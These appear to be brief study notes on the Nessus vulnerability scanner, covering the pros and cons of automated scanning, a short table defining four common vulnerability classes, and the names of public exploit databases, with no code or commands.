# Nessus

- Nessus has a community version and an enterprise version

## Advantages
- Automated scans are easy to repeat and results can be shared within a team with ease.
- These scanners are quick and can test numerous applications efficiently.
- Open-Source solutions exist
- Automated scanners cover a wide range of vulns which might other wise be very difficult to cover manually.

## Dis-Advantages
- People can often become reliant on these tools
- These are extremely loud and noisy and will be difficult to by-pass the firewalls
- Open-source licenses are often basic and you need to purchase licenses if you need enterprise grade features
- They often do not find every vuln on an app

|Vulnerability|Description|
|-|-|
|Security Mis-Configurations|these kind of vuns occur due to developer oversight. for example:- exposing server information in messages between app & attacker|
|Broken Access Control|this vul occurs when the attacker is able to access parts of the app which is he is not supposed to access|
|Insecure-Deserialization|This is the insecure processing of data that is sent across app. An attacker passes on malicious code waiting for it to be executed.|
|Injection|when the attacker is able to input malicious data into the app. Often this vuln becomes severe if there is no proper sanitization|

## Additional resources to exploit vulns

- Rapid7 - gives you metasploit related commands for executing & using exploits
- Github - submission of PoC's for exploits
- SearchSploit - offline vuln database
